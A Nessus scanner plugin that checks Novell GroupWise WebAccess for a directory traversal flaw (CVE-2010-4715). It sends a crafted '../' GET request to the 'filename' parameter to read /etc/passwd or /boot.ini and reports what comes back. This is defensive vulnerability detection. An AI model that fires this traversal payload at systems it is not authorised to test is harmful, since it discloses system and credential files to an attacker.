#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50694);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2010-4715");
  script_bugtraq_id(44732);
  script_osvdb_id(69138);
  script_xref(name:"Secunia", value:"40820");

  script_name(english:"Novell GroupWise WebAccess Arbitrary File Download");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:"The remote web server is susceptible to a directory traversal attack.");
  script_set_attribute(
    attribute:"description",value:
"The installed version of GroupWise WebAccess fails to perform
sufficient validation on a user specified file name supplied via
'filename' parameter before returning the contents of the file.

By supplying directory traversal strings such as '../' in a specially
crafted 'GET' request, it may be possible for a remote, unauthenticated
attacker to read arbitrary files from the remote system.");
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/viewContent.do?externalId=7007156");
  script_set_attribute(attribute:"solution", value:"Apply 8.02 Hot Patch 1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell GroupWise 8 WebAccess File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:groupwise_webaccess");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("groupwise_webaccess_accessible.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 7205, 7211);
  script_require_keys("www/groupwise-webaccess");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:7205, embedded:TRUE);
install = get_install_from_kb(appname:'groupwise-webaccess', port:port, exit_on_fail:TRUE);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "\[boot loader\]";

foreach file (files)
{
  url =  install['dir'] + "/log?filename=" +
    crap(data:"../", length:3*8) + '..' +
    file ;

  res = http_send_recv3(method:"GET", item:url, port:port,exit_on_fail:TRUE);

  if (res[0] =~ '^HTTP/1\\.[01] +401 ')
    exit (1, "Authentication is required to access the remote web server on port "+ port +".");

  if (res[2] && egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report = get_vuln_report(items:url, port:port);

      if (report_verbosity > 1)
      {
        report += '\n' +
          "Here are the contents : " + '\n\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          res[2] + '\n' +
          crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port:port);
    exit(0);
  }
}
exit(0,"The GroupWise WebAccess install listening on port "+ port + " is not affected.");
